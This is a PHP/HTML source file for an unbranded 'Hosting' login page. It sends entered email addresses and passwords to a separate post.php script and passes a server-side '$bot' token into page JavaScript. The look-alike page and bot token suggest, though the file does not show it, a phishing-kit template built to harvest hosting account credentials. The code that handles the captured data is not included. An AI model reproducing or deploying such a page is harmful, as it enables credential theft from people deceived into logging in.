<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/host.css">
<title>Hosting</title>

</head>
<body>
<header>
<div class="logo">
<img src="res/img/logo.png" > </div>
<div class="top"> <h3> Log in </h3></div>
</header>

<main>

<script>var token=<?php echo json_encode($bot); ?>;</script>
<div class="form">
    <div class="continer">
   
    <form action="post.php" method="post">
<div class="col">
<input type="text" name="user" placeholder="Email">
</div> 

<div class="col">
    <input type="password" name="pass" placeholder="Password">

    <div class="paso">
        <input type="checkbox" >
        <label >Remember me</label>
    </div>

    <div class="col">
        <button type="submit"> Log in</button></div>
    

<div class="forgot">
    <a href="#">Forgot password?</a>

</div>

<div class="title">
    Not a member yet? <a href="#"> Choose a hosting plan</a>
   <div > <label>and get started now!</label></div> </div>

<script src="./res/jq.js"></script>

</form>
</div>
</div>

</main>

</body>
</html>